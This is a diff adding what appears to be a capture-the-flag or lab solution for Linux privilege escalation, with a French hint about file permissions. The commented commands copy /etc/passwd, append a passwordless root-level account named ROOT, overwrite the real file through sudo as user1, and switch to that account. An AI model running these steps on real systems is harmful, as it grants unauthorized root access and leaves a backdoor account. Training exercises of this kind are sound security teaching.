@@ -1,0 +1,9 @@
+#SOLUTION : 
+# find / -user user1 -perm -u+w 2>/dev/null
+# cat /etc/passwd > /tmp/mypasswd
+# echo 'ROOT::0:0:root:/root:/bin/bash'>> /tmp/mypasswd
+# sudo -u user1 /bin/cp /tmp/mypasswd /etc/passwd
+# su ROOT
+
+#Hint 1 : 
+# Avez vous penser a regardé les permissions sur des fichiers précis ?
